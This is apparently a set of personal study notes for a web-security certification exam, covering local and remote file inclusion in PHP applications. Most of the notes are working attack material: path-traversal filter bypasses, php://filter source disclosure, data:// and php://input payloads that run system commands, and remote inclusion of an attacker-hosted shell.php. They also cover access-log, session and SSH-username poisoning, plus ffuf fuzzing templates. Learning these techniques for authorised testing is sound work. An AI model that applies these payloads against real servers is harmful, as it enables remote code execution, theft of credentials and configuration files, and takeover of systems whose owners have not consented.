# File Inclusion

| **Function**                 | **Read Content** | **Execute** | **Remote URL** |
| ---------------------------- | :--------------: | :---------: | :------------: |
| **PHP**                      |                  |             |                |
| `include()`/`include_once()` |         ✅        |      ✅      |        ✅       |
| `require()`/`require_once()` |         ✅        |      ✅      |        ❌       |
| `file_get_contents()`        |         ✅        |      ❌      |        ✅       |
| `fopen()`/`file()`           |         ✅        |      ❌      |        ❌       |
| **NodeJS**                   |                  |             |                |
| `fs.readFile()`              |         ✅        |      ❌      |        ❌       |
| `fs.sendFile()`              |         ✅        |      ❌      |        ❌       |
| `res.render()`               |         ✅        |      ✅      |        ❌       |
| **Java**                     |                  |             |                |
| `include`                    |         ✅        |      ❌      |        ❌       |
| `import`                     |         ✅        |      ✅      |        ✅       |
| **.NET**                     |                  |             |                |
| `@Html.Partial()`            |         ✅        |      ❌      |        ❌       |
| `@Html.RemotePartial()`      |         ✅        |      ❌      |        ✅       |
| `Response.WriteFile()`       |         ✅        |      ❌      |        ❌       |
| `include`                    |         ✅        |      ✅      |        ✅       |

| **Feature**        | **Direct LFI**                                                             | **Second-Order LFI**                                                                                               |
| ------------------ | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------ |
| **Input Source**   | Direct user input (e.g., URL parameters like `?language=`).                | Indirect input pulled from a database (e.g., a stored username).                                                   |
| **Attack Process** | One-step: The payload is sent and executed immediately in the request.     | Two-step: 1. **Poison** a database entry (Registration). 2. **Trigger** the vulnerability (Profile view/Download). |
| **Trust Factor**   | Low trust; developers often implement filters or WAFs on these parameters. | High trust; developers often assume data already in the database is safe.                                          |
| **Visibility**     | Easily spotted in web logs and URL history.                                | Harder to detect as the malicious payload is stored "at rest" before being used.                                   |
| **Example**        | `index.php?language=/etc/passwd`                                           | Setting a username to `../../../etc/passwd` so an avatar download script fetches the system file.                  |

| **Feature**                | **First-Order Attack**                                 | **Second-Order Attack**                                             |
| -------------------------- | ------------------------------------------------------ | ------------------------------------------------------------------- |
| **Directness**             | Direct (User → Server → Execution)                     | Indirect (User → Database → Server → Execution)                     |
| **Timing**                 | Immediate execution.                                   | Delayed execution (can be days later).                              |
| **Detection**              | Easier to catch with a WAF (looking at URL/POST data). | Harder to catch (WAFs rarely scan data coming _out_ of a database). |
| **Complexity**             | Low to Medium.                                         | High (requires understanding how data flows through the app).       |
| **Common Vulnerabilities** | Basic LFI, Reflected XSS, SQLi.                        | Stored XSS, Second-Order SQLi, Second-Order LFI.                    |

\*\*1. First-Order Attack Examples (Direct)

In these examples, the attack happens the moment you click "Send." The server takes your input and uses it immediately.

**Example A: Local File Inclusion (LFI)**

* **The Scenario:** A website loads pages using a `page` parameter.
* **The Code:** `include($_GET['page']);`
* **The Attack:** 1. The attacker goes to: `http://site.com/index.php?page=../../../../etc/passwd` 2. The server immediately processes the `../../../../etc/passwd` string. 3. The contents of the sensitive file are displayed on the screen instantly.

**Example B: SQL Injection (SQLi)**

* **The Scenario:** A login form checks credentials.
* **The Code:** `SELECT * FROM users WHERE username = '$user' AND password = '$pass'`
* **The Attack:**
  1. The attacker enters `admin' OR '1'='1' --` in the username field.
  2. The server executes the query immediately.
  3. The attacker is logged in as the first user in the database (usually the admin) without a password.

***

\*\*2. Second-Order Attack Examples (Stored)

In these examples, the attack is a "time bomb." You plant the payload in the database first, and it sits there quietly until a different part of the system pulls it out.

**Example A: Second-Order LFI (The Profile Trick)**

* **The Scenario:** A web app allows you to choose a "Preferred Theme" in your settings.
* **Step 1 (Poisoning):**
  * You go to your profile settings.
  * In the "Theme Name" box, you type: `../../../etc/passwd`
  * The website saves this string to the database: `UPDATE users SET theme = '../../../etc/passwd' WHERE id = 5;`
  * **Nothing happens yet.** The page just says "Settings Saved."
* **Step 2 (Execution):**
  * An hour later, you (or an admin) visit your "User Dashboard."
  * The dashboard code pulls your theme from the database: `$theme = $db->getTheme(user_id);` `include("/var/www/html/themes/" . $theme . ".php");`
  * The server suddenly tries to include `/etc/passwd`. **The attack is now triggered.**

**Example B: Second-Order SQLi (The Password Reset)**

* **The Scenario:** A user can change their password.
* **Step 1 (Poisoning):**
  * An attacker registers a new account with the username: `admin'--`
  * The database now contains a user named `admin'--`.
* **Step 2 (Execution):**
  * The attacker goes to the "Change Password" page.
  * The code looks like this: `UPDATE users SET password = '$new_pass' WHERE username = '$username';`
  * Because the `$username` pulled from the database is `admin'--`, the query becomes: `UPDATE users SET password = 'hacked' WHERE username = 'admin'--';`
  * The `--` comments out the rest of the query. The database updates the password for the **real admin** account instead of the attacker's account.

***

***

\*\*PHP Filters

* If you use a standard LFI to include a `.php` file (like `config.php`), the server will **execute** the code. Since `config.php` usually just sets variables and doesn't output text, you see a blank page.
* By using the `php://filter/convert.base64-encode/resource=filename` wrapper, you tell PHP to encode the file in Base64 **before** it gets processed.

| **Attack Category**       | **Filter / Protection Type**                     | **Payload Example**                       | **Logic / Mechanism**                                                                                             |
| ------------------------- | ------------------------------------------------ | ----------------------------------------- | ----------------------------------------------------------------------------------------------------------------- |
| **Non-Recursive Filters** | `str_replace('../', '', ...)` (Simple removal)   | `....//....//etc/passwd`                  | The filter removes the inner `../`, and the remaining characters join together to form a new `../`.               |
| **URL Encoding**          | Blacklisted dots `.` or slashes `/`              | `%2e%2e%2f%2e%2e%2fetc/passwd`            | Bypasses character-based filters by hiding them in their URL-encoded hex format.                                  |
| **Double Encoding**       | Advanced WAFs or multi-layered filters           | `%252e%252e%252fetc/passwd`               | The WAF decodes it once (seeing `%2e`), but the application decodes it again into a functional `/`.               |
| **Approved Paths**        | `preg_match` (Must start with a specific folder) | `./languages/../../../../etc/passwd`      | You start the string with the "valid" directory to pass the check, then use traversal to leave that folder.       |
| **Null Byte Injection**   | Appended Extensions (e.g., `.php`) on PHP < 5.5  | `/etc/passwd%00`                          | Uses the null character `%00` to tell the server the string ends there, ignoring any extension added by the code. |
| **Path Truncation**       | Appended Extensions on PHP < 5.3/5.4             | `[dir]/../../etc/passwd/././.` (repeated) | Exploits the 4096-character limit to "push" the appended extension out of the memory buffer.                      |

| **Component**            | **Description**                                                                                                                         |
| ------------------------ | --------------------------------------------------------------------------------------------------------------------------------------- |
| **PHP Wrappers**         | Built-in streams (`php://`) that allow developers (and attackers) to access I/O, memory, and filters at the application level.          |
| **The "Filter" Wrapper** | Specifically `php://filter/`, which allows you to apply transformations (like encoding) to a file stream.                               |
| **Conversion Filters**   | The most useful for LFI is `convert.base64-encode`. It turns the PHP source code into a Base64 string so the server doesn't execute it. |
| **Why use it?**          | To bypass execution and read sensitive files like `config.php`, which often contain database credentials, API keys, and secret logic.   |

\*\*The 3-Step Exploitation Workflow

1. **Fuzzing for Targets:** Use tools like **ffuf** or **gobuster** to find hidden PHP files (e.g., `config.php`, `db.php`, `setup.php`). Don't ignore `403 Forbidden` or `302 Redirect` pages—you can still read their source code with LFI.
2. **Encoding the Stream:** Use the filter wrapper to target the identified file.
   * **Payload Template:** `php://filter/read=convert.base64-encode/resource=FILE_NAME`
   * _Note:_ If the application automatically adds `.php`, do not include the extension in your resource name.
3. **Decoding the Result:** Copy the resulting Base64 string from the browser and decode it in your terminal.
   * **Command:** `echo "BASE64_STRING" | base64 -d`

\*\*Critical Concept: Execution vs. Disclosure

* **Standard LFI (`/etc/passwd`):** The server reads the file and prints the text.
* **Standard PHP LFI (`config.php`):** The server sees the `<?php` tag, executes the code, and returns nothing to the browser.
* **Filter-based LFI:** The server encodes the file into Base64 **first**. Since the resulting string doesn't start with `<?php`, the server just prints the Base64, allowing you to steal the raw code

***

***

**Remote Code Execution (RCE)**

This section marks the transition from **Information Disclosure** (reading files) to **Remote Code Execution (RCE)**. In the CWES journey, this is the "Golden Goal"—moving from seeing the data to controlling the server.

The vulnerability is present when the PHP configuration is "too permissive," allowing the application to treat external strings or input streams as executable code.

***

#### ## 🛠️ When is the Vulnerability Present? (Pre-checks)

Before you can achieve RCE, you must check the **`php.ini`** configuration file. The success of these attacks depends entirely on these specific settings:

To check these we need to use the these php filter

```
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

| **Setting**                  | **Required for...**         | **How to Check (using LFI)**                                |
| ---------------------------- | --------------------------- | ----------------------------------------------------------- |
| **`allow_url_include = On`** | `data://` and `php://input` | Read `php.ini` via `php://filter` and grep for the setting. |
| **`extension=expect`**       | `expect://`                 | Read `php.ini` and look for the extension directive.        |

***

#### ## 🚀 How to Exploit It (The Attack Matrix)

Once you confirm the settings above, you can use the following wrappers to trigger RCE:

| **Wrapper**       | **Attack Vector**                                      | **Payload Format**                                                                                |
| ----------------- | ------------------------------------------------------ | ------------------------------------------------------------------------------------------------- |
| **`data://`**     | Pass code directly in the URL (Base64 encoded).        | `=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`             |
| **`php://input`** | Pass code in the **POST Body** of the request.         | `curl -X POST --data "<?php system('id'); ?>" "http://target.com/index.php?language=php://input"` |
| **`expect://`**   | Directly execute system commands (no PHP code needed). | `?language=expect://id`                                                                           |

***

#### ## 📝 Step-by-Step Exploitation Workflow

**Step 1: Locate the `php.ini` File**

You need to know if the "door is unlocked." Use your existing LFI to read the config:

* **Apache Path:** `/etc/php/7.4/apache2/php.ini` (Version numbers vary).
* **Payload:** `?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini`

**Step 2: Generate your Web Shell (for `data://`)**

Don't just type code; Base64 encode it to avoid breaking the URL syntax.

Bash

```
In here we need to add the php code for the remote code exection with the base64 encoded
```

**Step 3: Execute and Verify**

Send the payload and use the `&cmd=` parameter to run Linux commands. If successful, you will see the output of the `id` command (e.g., `uid=33(www-data)`) in the web page response.

***

\*\*🧠 Why RFI Occurs

RFI happens when a developer uses a file-handling function (like `include()`, `require()`, or `file_get_contents()`) and allows the user to control the **protocol wrapper** (e.g., `http://`, `https://`, `ftp://`).

**The technical requirements for RFI (in PHP):**

* **Permissive Configuration:** The `allow_url_include` setting must be set to **`On`** in the `php.ini` file.
* **Unsanitized Input:** The application doesn't check if the "language" or "page" parameter contains a URL.

\*\*🛠️ How to Exploit RFI

The exploitation process moves in three distinct stages: **Verify**, **Host**, and **Include**.

\*\*Verification (The Loopback Test)

Before setting up a server, check if the app can even talk to itself.

* **Payload:** `?language=http://127.0.0.1:80/index.php`
* **The Goal:** If the page renders its own `index.php` inside the content area, it is vulnerable to RFI.

\*\*The Attack Matrix (Hosting your Shell)

Depending on the server's firewall, you have three main ways to deliver your payload.

| **Method** | **When to use it**                                            | **Commands to Setup**             |
| ---------- | ------------------------------------------------------------- | --------------------------------- |
| **HTTP**   | The "Standard" method. Good if outgoing port 80 is open.      | `python3 -m http.server 80`       |
| **FTP**    | Use if `http://` is blocked by a WAF.                         | `python3 -m pyftpdlib -p 21`      |
| **SMB**    | **Windows Targets only.** Bypasses `allow_url_include = Off`. | `impacket-smbserver share $(pwd)` |

\*\*Execution

Once your server is running and your `shell.php` is ready:

1. **Craft the URL:** `http://<TARGET_IP>/index.php?language=http://<YOUR_IP>/shell.php&cmd=id`
2. **The Result:** The target server fetches your code, runs it, and your `id` command output appears on the target's page.

\*\*🔍 The Windows "SMB" Loophole

This is a critical tip for your **CWES** exam. On Windows-based web servers, RFI can often be achieved via **SMB** (`\\IP\share\file.php`) even if `allow_url_include` is **Disabled**.

Windows treats UNC paths as "local-ish" files, so it doesn't trigger the same security warnings that a standard `http://` request would.

\*\*Example for http RFI

```
http://10.129.29.114/index.php?language=http://10.10.16.191:8081/shell.php&cmd=id
# In that shell.php is there the code of php remote code exection
```

\*\*Summary Table: LFI vs. RFI

| **Feature**       | **Local File Inclusion (LFI)** | **Remote File Inclusion (RFI)**     |
| ----------------- | ------------------------------ | ----------------------------------- |
| **Source**        | Files already on the disk.     | External files (HTTP/FTP/SMB).      |
| **Requirement**   | Directory Traversal (`../`).   | Protocol Wrapper (`http://`).       |
| **Default State** | Often possible by default.     | Usually **Disabled** by default.    |
| **Main Goal**     | Read source code/configs.      | Direct Remote Code Execution (RCE). |

***

\*\*LFI and File Uploads

By using the file uploading function getting to get the remote code access

when ever we upload a file in application that the application must store in a DIR when ever we find the location of DIR and also we want to upload the file with RCE code if it is vuln to the LFI and not properly secure for the fileupload attacks it can be vuln

| **Method**                 | **Technique**                                                   | **Payload Format**                                                                                                         |
| -------------------------- | --------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------- |
| **1. The Malicious Image** | Injecting PHP code into an image file (e.g., a GIF).            | `http://154.57.164.64:31799/index.php?language=./profile_images/shell.gif&cmd=cat%20/2f40d853e2d4768d87da1c81772bae0a.txt` |
| **2. The Zip Wrapper**     | Zipping a PHP shell and including it via the `zip://` protocol. | `?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`                                                            |
| **3. The Phar Wrapper**    | Using a PHP Archive (`.phar`) to store and trigger a shell.     | `?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`                                                           |

#### 1. PHP Session Poisoning

PHP keeps track of users via a `PHPSESSID` cookie. This session data is stored in a file on the server's disk.

* **The Path:** \* Linux: `/var/lib/php/sessions/sess_[YOUR_COOKIE_ID]`
  * Windows: `C:\Windows\Temp\sess_[YOUR_COOKIE_ID]`
*   **The Attack:** 1. **Find the cookie:** Look in your browser's "Application" tab for your `PHPSESSID`.

    2. **Verify access:** Try to read the session file via LFI: `?language=/var/lib/php/sessions/sess_abc123...`
    3. **Inject the Shell:** If the application stores a value you control in the session (like a "page" or "theme" preference), change that value to your web shell:

    \`?language= PHP code for the RCE

    4. **Execute:** Re-visit the session file path and add your command: `&cmd=id`.

***

#### ## 2. Server Log Poisoning (Apache/Nginx)

Every time you visit a website, the server logs your request in an `access.log` file. This log usually includes your **User-Agent**.

* **The Path:**
  * Apache: `/var/log/apache2/access.log`
  * Nginx: `/var/log/nginx/access.log`
* **The Attack:**
  1. **Verify access:** Check if you can read the log: `?language=/var/log/apache2/access.log`.
  2.  **Poison the header:** Use Burp Suite or `curl` to change your **User-Agent** header to a PHP shell:

      \`User-Agent: PHP code for the RCE
  3.  **Trigger:** Once the log file has that line, include the log file again through your LFI:

      `?language=/var/log/apache2/access.log&cmd=whoami`

***

#### ## 📊 Comparison of Poisoning Targets

| **Target**       | **Controller**         | **Typical Path**              | **Access Level**                  |
| ---------------- | ---------------------- | ----------------------------- | --------------------------------- |
| **PHP Sessions** | Cookies / Session Data | `/var/lib/php/sessions/`      | Usually readable by `www-data`.   |
| **Apache Log**   | User-Agent / URL       | `/var/log/apache2/access.log` | Often requires higher privileges. |
| **Nginx Log**    | User-Agent / URL       | `/var/log/nginx/access.log`   | Usually readable by `www-data`.   |
| **SSH Log**      | Login Username         | `/var/log/auth.log`           | Often restricted to root/adm.     |

!\[\[Pasted image 20260415014437.png|463]]

!\[\[Pasted image 20260415014504.png|477]]

!\[\[Pasted image 20260415014529.png|484]]

| **Attack Type**           | **Target File Path (Linux / Windows)**                                                                          | **Poisoning Vector (How to Inject)**                                                                        | **Exploitation Step**                                                       |
| ------------------------- | --------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| **PHP Session Poisoning** | <p><code>/var/lib/php/sessions/sess_[ID]</code><br><br><code>C:\Windows\Temp\sess_[ID]</code></p>               | Control a parameter (like `?language=`) that the app saves into the session file.                           | Include the session file using your **PHPSESSID** cookie value.             |
| **Apache Log Poisoning**  | <p><code>/var/log/apache2/access.log</code><br><br><code>C:\xampp\apache\logs\access.log</code></p>             | Modify the **User-Agent** header in your HTTP request to contain PHP code.                                  | Include the `access.log` file via LFI and pass commands via `&cmd=`.        |
| **Nginx Log Poisoning**   | <p><code>/var/log/nginx/access.log</code><br><br><code>C:\nginx\log\access.log</code></p>                       | Similar to Apache; inject PHP into headers or URL strings that get logged.                                  | Include the `access.log` file. Nginx logs are often readable by `www-data`. |
| **Process Environment**   | `/proc/self/environ`                                                                                            | The **User-Agent** is often stored here for the current process.                                            | Include the file to trigger code execution if logs are unreadable.          |
| **Service Logs**          | <p><code>/var/log/sshd.log</code><br><br><code>/var/log/mail</code><br><br><code>/var/log/vsftpd.log</code></p> | Attempt to login with a **username** set to PHP code or send an **email** containing PHP.                   | Include the specific service log once it contains your "poisoned" entry.    |
| **Attack Type**           | **Default Linux Path**                                                                                          | **Poisoning Vector (Injection)**                                                                            | **Exploitation Step (LFI Trigger)**                                         |
| **PHP Session Poisoning** | `/var/lib/php/sessions/sess_[ID]`                                                                               | Modify a parameter that the app saves to the session (e.g., `?language=PHP RCE code here`).                 | `?language=/var/lib/php/sessions/sess_[ID]&cmd=id`                          |
| **Apache Access Log**     | `/var/log/apache2/access.log`                                                                                   | Use Burp or `curl` to set the **User-Agent** header to `PHP RCE code here`.                                 | `?language=/var/log/apache2/access.log&cmd=id`                              |
| **Nginx Access Log**      | `/var/log/nginx/access.log`                                                                                     | Similar to Apache; inject PHP into the **User-Agent** or a URL that gets logged.                            | `?language=/var/log/nginx/access.log&cmd=id`                                |
| **Process Environ**       | `/proc/self/environ`                                                                                            | Set your **User-Agent** to a PHP shell. The environment file reflects this for the current process.         | `?language=/proc/self/environ&cmd=id`                                       |
| **SSH Log**               | `/var/log/auth.log`                                                                                             | Attempt to SSH into the server using a username that is actually PHP code: `ssh 'PHP RCE code here '@<IP>`. | `?language=/var/log/auth.log&cmd=id`                                        |
| **Email/Mail Log**        | `/var/log/mail`                                                                                                 | Send an email to a local user where the **Subject** or **Body** contains PHP code.                          | `?language=/var/log/mail&cmd=id`                                            |

***

***

## To Automate the above process

| **Step** | **Task**                  | **Purpose**                                                                                             | **Command Template**                                                                                      |
| -------- | ------------------------- | ------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------- |
| **1**    | **Parameter Fuzzing**     | Find hidden `GET` parameters that might be vulnerable (e.g., finding `?page=` when it's not in the UI). | `ffuf -w [wordlist]:FUZZ -u 'http://SERVER/index.php?FUZZ=value' -fs [size]`                              |
| **2**    | **LFI Payload Testing**   | Test an identified parameter against hundreds of LFI bypasses and traversal strings.                    | `ffuf -w [lfi_list]:FUZZ -u 'http://SERVER/index.php?language=FUZZ' -fs [size]`                           |
| **3**    | **Webroot Discovery**     | Find the absolute path of the web folder (useful for log poisoning or file uploads).                    | `ffuf -w [webroot_list]:FUZZ -u 'http://SERVER/index.php?language=../../../../FUZZ/index.php' -fs [size]` |
| **4**    | **Configuration Fuzzing** | Locate server config files (like `apache2.conf`) to find log paths or hidden settings.                  | `ffuf -w [linux_list]:FUZZ -u 'http://SERVER/index.php?language=../../../../FUZZ' -fs [size]`             |
|          |                           |                                                                                                         |                                                                                                           |

* **Parameters:** `/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt`
* **LFI Payloads:** `/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt`
* **Linux Files:** `/usr/share/seclists/Fuzzing/LFI/LFI-interesting-files-Linux.txt`
